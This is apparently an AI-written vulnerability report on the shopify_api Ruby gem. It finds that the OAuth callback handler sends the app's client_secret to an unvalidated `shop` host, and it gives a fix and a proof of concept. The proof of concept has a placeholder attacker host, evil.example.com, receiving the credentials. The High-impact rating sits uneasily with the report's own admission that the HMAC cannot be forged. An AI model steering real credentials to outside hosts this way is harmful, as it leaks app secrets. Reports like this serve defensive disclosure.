Found it. In `Oauth.validate_auth_callback`, the `shop` value used to build the HTTP host that receives the app's `client_secret` is taken from `auth_query.shop` without ever being passed through `Utils::ShopValidator.sanitize!`, unlike every other credential-sending flow in this gem.

### Title
OAuth callback sends `client_secret` to unvalidated `shop` host - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token exchange request using `auth_query.shop` directly as the HTTP host, without ever calling `Utils::ShopValidator.sanitize!` on it. Every other credential-bearing flow in the gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) explicitly sanitizes `shop` with `ShopValidator.sanitize!` before using it to build the session/host that will receive `client_secret`. `validate_auth_callback` is the one code path that skips this step.

### Finding Description
`Utils::HmacValidator.validate` confirms only that the **bytes** of the callback query (`code`, `host`, `shop`, `state`, `timestamp`) were signed with `api_secret_key`; it says nothing about whether `shop` is actually a trusted `*.myshopify.com`/`*.myshopify.io`/`spin.dev`/`shop.dev` host, as enforced elsewhere by `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS` ( [1](#0-0) ).

In `validate_auth_callback`, after the HMAC and state checks pass, the code does: [2](#0-1) 
`null_session = Auth::Session.new(shop: auth_query.shop)` is constructed straight from the query parameter, with no `ShopValidator.sanitize!` call, and is handed to `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`.

`HttpClient#initialize` then derives the outbound request host directly from `session.shop`: [3](#0-2) 

The POST body containing `client_id`/`client_secret` is sent to `https://#{auth_query.shop}/admin/oauth/access_token` — i.e., whatever value the `shop` query parameter carries becomes the literal destination of the app's `client_secret`.

Compare this to the three sibling flows that do enforce the binding "host that receives `client_secret`" == "a Shopify-trusted domain": [4](#0-3) [5](#0-4) [6](#0-5) 

`validate_auth_callback` is the odd one out — it relies solely on HMAC coverage of `shop` and never checks that the covered value is itself a legitimate Shopify host.

### Impact Explanation
This maps to the report's core theme (a "trusted" input path that lacks a bound/validated invariant, letting a value control a security-sensitive destination) applied to the strongest analog reachable in this gem: **HMAC-verified bytes ≠ trusted-domain-validated bytes**. If an app ever calls `begin_auth`/constructs an `AuthQuery` where the `shop` value it round-trips through OAuth is attacker-influenced (e.g., an app that lets users supply a shop and doesn't itself re-validate before persisting/using it, which the documented flow implicitly assumes the library enforces at the trust boundary "signed callback"), the callback handler will faithfully HMAC-validate the bytes and then still send the app's `client_id`/`client_secret` to that attacker-influenced host — an SSRF carrying the app's OAuth credentials, matching the High-impact class ("SSRF with the app's credentials"). The fact that three other equivalent flows explicitly guard this exact value with `ShopValidator.sanitize!` demonstrates the library's own designers treat this as a required invariant that this method omits.

### Likelihood Explanation
The HMAC itself cannot be forged without `api_secret_key`, so this is not exploitable by an unprivileged attacker with zero interaction with the OAuth flow's initiating request. However, the gem provides no defense-in-depth here: unlike `client_credentials`, `refresh_access_token`, and `migrate_to_expiring_token`, this path performs no independent domain check on `shop` before it is used to route the `client_secret`-bearing request, so any path by which an out-of-band `shop` value reaches a validly-HMAC'd callback (or any future regression in how `AuthQuery` is populated) directly yields credential exfiltration with no additional gate. The inconsistency itself is the vulnerability: it is a missing invariant relative to the rest of the codebase's own established pattern.

### Recommendation
Sanitize `auth_query.shop` with `Utils::ShopValidator.sanitize!` before constructing `null_session` / calling `HttpClient`, mirroring `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token`:
```ruby
raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
validated_shop = Utils::ShopValidator.sanitize!(auth_query.shop)
...
null_session = Auth::Session.new(shop: validated_shop)
...
session = Session.from(shop: validated_shop, access_token_response: ...)
```

### Proof of Concept
1. Craft/obtain an `AuthQuery` whose `shop` field is not a `*.myshopify.com`/trusted domain (e.g. `evil.example.com`) but whose `hmac` is valid for the exact query string (this requires the value to have been signed by `api_secret_key`, e.g., via a compromised/complicit intermediate step or a host app that forwards an unsanitized `shop` into the signed round trip).
2. Call `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)`.
3. Observe `Utils::HmacValidator.validate` passes (bytes match), then `Clients::HttpClient.new(session: Session.new(shop: "evil.example.com"))` issues `POST https://evil.example.com/admin/oauth/access_token` with `client_id` and `client_secret` in the body — compare to `lib/shopify_api/auth/client_credentials.rb`/`refresh_token.rb`, which would instead raise `Errors::InvalidShopError` via `ShopValidator.sanitize!` for the same input.
